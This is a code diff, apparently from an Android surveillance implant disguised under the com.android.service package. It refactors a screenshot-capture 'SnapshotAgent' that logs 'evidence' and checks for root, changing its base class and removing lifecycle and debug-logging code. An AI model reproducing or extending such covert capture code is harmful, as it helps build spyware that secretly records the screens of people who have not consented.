@@ -27,6 +27,7 @@ import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.ThreadBase;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAgent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.file.AutoFile;
@@ -39,7 +40,7 @@ import com.android.service.util.WChar;
 /**
  * The Class SnapshotAgent.
  */
-public class AgentSnapshot extends BaseAgent {
+public class AgentSnapshot extends BaseInstantAgent {
 
 	private static final int LOG_SNAPSHOT_VERSION = 2009031201;
 	private static final int MIN_TIMER = 1 * 1000;
@@ -75,7 +76,7 @@ public class AgentSnapshot extends BaseAgent {
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
-	public boolean parse(AgentConf conf) {		
+	public boolean parse(ConfAgent conf) {		
 		try {
 			String qualityParam = conf.getString("quality");
 			if("low".equals(qualityParam)){
@@ -98,54 +99,10 @@ public class AgentSnapshot extends BaseAgent {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
-	 */
-	@Override
-	public void begin() {
-		setDelay(SOON);
-		setPeriod(NEVER);
-	}
-
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
-	 */
-	@Override
-	public void end() {
-
-	}
-
-	/*
-	 * (non-Javadoc)
-	 * 
 	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
 	 */
 	@Override
-	public synchronized void go() {
-		switch (type) {
-		case CAPTURE_FULLSCREEN:
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Snapshot Agent: logging full screen") ;//$NON-NLS-1$
-			}
-			
-			break;
-
-		case CAPTURE_FOREGROUND:
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Snapshot Agent: logging foreground window") ;//$NON-NLS-1$
-			}
-			
-			break;
-
-		default:
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Snapshot Agent: wrong capture parameter") ;//$NON-NLS-1$
-			}
-			
-			break;
-		}
-
+	public synchronized void actualStart() {
 		try {
 			if (Status.self().haveRoot()) {
 				final boolean isScreenOn = ListenerStandby.isScreenOn();
